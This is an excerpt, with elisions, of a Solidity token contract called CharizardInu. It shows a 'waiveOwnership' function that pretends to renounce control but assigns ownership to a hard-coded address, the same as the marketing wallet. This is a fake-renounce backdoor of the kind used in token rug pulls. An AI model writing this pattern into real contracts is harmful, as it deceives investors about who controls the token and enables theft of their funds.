...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB0aaE030CC4Ea3727792F2bF818023d3248288a4);
    }
...
contract CharizardInu is Context, IERC20, Ownable {
    ...
    string private _symbol = "CHRZ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xB0aaE030CC4Ea3727792F2bF818023d3248288a4);
    address payable public teamWalletAddress = payable(0x320696dD0ec2Bd8280E86749358ae03BdF26b923);
